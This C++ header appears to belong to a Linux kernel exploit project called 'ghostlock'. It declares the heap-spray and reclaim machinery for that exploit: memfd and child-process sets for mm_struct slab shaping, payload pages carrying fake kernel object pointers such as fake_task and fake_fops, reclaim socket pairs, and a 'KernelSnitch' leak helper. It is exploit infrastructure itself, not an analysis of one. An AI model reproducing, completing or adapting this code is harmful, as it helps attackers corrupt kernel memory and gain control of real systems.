#ifndef HEAP_CONTEXT_H
#define HEAP_CONTEXT_H

#include <cstddef>
#include <cstdint>
#include <sys/types.h>

#include <memory>
#include <type_traits>
#include <vector>

#include "support/native_resource.hpp"

namespace ghostlock::kernelsnitch {
struct kernelsnitch_shared_state;
}

namespace ghostlock::memory {
    /* Owns the per-attempt mm-shaping child pid and memfd arrays. The vectors free
 * their storage on destruction, but they never kill a child or close a memfd:
 * a forked helper that reaches exit() must not release the parent's resources.
 * Release stays explicit through close_ctx_memfds()/free_ctx_storage(). */
    struct MmContextSet {
        std::vector<pid_t> childs;
        std::vector<int> memfds;
    };
} // namespace ghostlock::memory

namespace ghostlock::memory {
    enum class PayloadPageState : int {
        Empty = 0,
        Current,
        Prebuilt,
        Quarantined,
    };

    typedef struct ReclaimPair {
        int fd[2];
    } ReclaimPair;

    typedef struct PayloadPage {
        uintptr_t base;
        uintptr_t last_mm_struct;
        uintptr_t fake_lock;
        uintptr_t fake_w0;
        uintptr_t fake_task;
        uintptr_t fake_parent;
        uintptr_t fake_right;
        uintptr_t fake_left;
        uintptr_t fake_fops;
        ReclaimPair reclaim;
        PayloadPageState state;
        /* Move-only owner of one payload page and its reclaim socket pair.
     *
     * There is deliberately no destructor: a page whose fds may still be
     * referenced by the kernel must never be released by scope exit. Use
     * destroy() for the explicit release and move_to() to transfer ownership.
     * A moved-from page is left empty; the fds travel with the destination. */
        PayloadPage() noexcept;

        PayloadPage(const PayloadPage &) = delete;

        PayloadPage &operator=(const PayloadPage &) = delete;

        PayloadPage(PayloadPage &&other) noexcept;

        PayloadPage &operator=(PayloadPage &&) = delete;

        [[nodiscard]] bool has_reclaim() const noexcept;

        void destroy() noexcept;

        [[nodiscard]] bool move_to(PayloadPage &destination,
                                   PayloadPageState destination_state) noexcept;
    } PayloadPage;

    static_assert(std::is_standard_layout_v<PayloadPage>);
    static_assert(!std::is_copy_constructible_v<PayloadPage>);
    static_assert(!std::is_copy_assignable_v<PayloadPage>);
    static_assert(std::is_move_constructible_v<PayloadPage>);
    /* No implicit release on scope exit: the destructor stays trivial. */
    static_assert(std::is_trivially_destructible_v<PayloadPage>);

    typedef struct HeapContext {
        ghostlock::kernelsnitch::kernelsnitch_shared_state *snitch;
        size_t mm_objs_per_slab;
        std::unique_ptr<unsigned char[]> skb_buffer;
        MmContextSet prepare;
        MmContextSet spray;
        MmContextSet pre;
        MmContextSet post;
        /* Owns the KernelSnitch collision helper until it exits; mark_reaped()
     * records the waitpid() the spray path performs, so scope exit never
     * signals a pid twice. */
        ChildProcess leak_child;
        UniqueFd leak_memfd;
        PayloadPage current;
        PayloadPage prebuilt;
        PayloadPage quarantine;

        void init();
    } HeapContext;

    void close_ctx_memfds(MmContextSet *ctx);

    void free_ctx_storage(MmContextSet *ctx);
} // namespace ghostlock::memory


#endif
